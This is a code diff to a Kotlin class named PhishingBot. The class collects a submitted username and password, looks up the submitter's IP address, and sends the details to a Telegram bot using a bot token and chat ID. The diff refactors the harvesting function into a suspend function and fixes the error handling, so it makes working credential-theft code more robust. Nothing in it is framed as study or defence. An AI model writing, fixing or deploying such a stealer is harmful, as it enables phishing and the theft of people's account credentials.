@@ -7,6 +7,7 @@ import kotlinx.coroutines.flow.asStateFlow
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
+import java.net.URLEncoder
 
 class PhishingBot {
     companion object {
@@ -17,8 +18,9 @@ class PhishingBot {
     private val _status = MutableStateFlow("Waiting for input...")
     val status: StateFlow<String> = _status.asStateFlow()
 
-    fun submitData(username: String, password: String) {
-        CoroutineScope(Dispatchers.IO).launch {
+    // Fix: Function ko suspend kora holo
+    suspend fun submitData(username: String, password: String) {
+        withContext(Dispatchers.IO) {
             _status.value = "Verifying..."
             
             val ipAddress = getIpAddress()
@@ -48,7 +50,7 @@ class PhishingBot {
     }
 
     private suspend fun getIpAddress(): String {
-        try {
+        return try {
             val url = URL("https://api.ipify.org?format=json")
             val connection = url.openConnection() as HttpURLConnection
             connection.requestMethod = "GET"
@@ -60,16 +62,18 @@ class PhishingBot {
                 val inputStream = connection.inputStream.bufferedReader()
                 val response = inputStream.readText()
                 val json = JSONObject(response)
-                return json.getString("ip")
+                json.getString("ip")
+            } else {
+                "Unknown"
             }
         } catch (e: Exception) {
             e.printStackTrace()
+            "Unknown"
         }
-        return "Unknown"
     }
 
     private suspend fun sendToTelegram(message: String) {
-        val telegramUrl = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=${java.net.URLEncoder.encode(message, "UTF-8")}&parse_mode=Markdown"
+        val telegramUrl = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=${URLEncoder.encode(message, "UTF-8")}&parse_mode=Markdown"
         val url = URL(telegramUrl)
         val connection = url.openConnection() as HttpURLConnection
         connection.requestMethod = "GET"
@@ -77,11 +81,4 @@ class PhishingBot {
         connection.readTimeout = 5000
         connection.inputStream.bufferedReader().use { it.readText() }
     }
-}
-
-// Usage Example
-fun main() {
-    val bot = PhishingBot()
-    // Simulate a login
-    bot.submitData("admin", "SecretPassword123")
 }
